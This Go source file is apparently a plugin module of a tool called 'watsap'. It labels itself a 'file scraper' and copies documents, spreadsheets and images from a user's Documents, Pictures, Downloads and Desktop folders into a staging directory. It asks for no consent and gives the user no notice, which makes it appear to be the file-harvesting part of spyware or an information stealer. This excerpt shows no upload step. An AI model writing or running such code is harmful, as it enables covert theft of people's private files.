package files

import (
	"log"
	"os"
	"path/filepath"
	"watsap/utils/config"
)

var extensions = []string{
	".txt", ".jpg", ".png", ".jpeg", "heif",
	".pdf", ".docx", ".xlsx", ".pptx",
	".doc", ".xls", ".ppt",
}

func getSourceDirectories() []string {
	var baseDir string
	if config.Platform == "windows" {
		baseDir = os.Getenv("USERPROFILE")
	} else {
		baseDir = os.Getenv("HOME")
	}
	if baseDir == "" {
		log.Println("ERROR: HOME or USERPROFILE environment variable not set")
		return nil
	}
	dirs := []string{
		filepath.Join(baseDir, "Documents"),
		filepath.Join(baseDir, "Pictures"),
		filepath.Join(baseDir, "Downloads"),
		filepath.Join(baseDir, "Desktop"),
	}
	return dirs
}

func InitFiles() {
	log.Println("[File] Starting file scraper plugin")
	log.Printf("[File] srcDirs: %v", getSourceDirectories())
	log.Printf("[File] dstDir: %s", config.FilesDir)
	log.Printf("[File] extensions: %v", extensions)

	srcDirs := getSourceDirectories()
	if srcDirs == nil {
		return
	}
	dstDir := config.FilesDir
	if err := copyFilesWithExtensions(srcDirs, dstDir, extensions); err != nil {
		log.Printf("ERROR: [File] Error copying files: %v", err)
	}
}
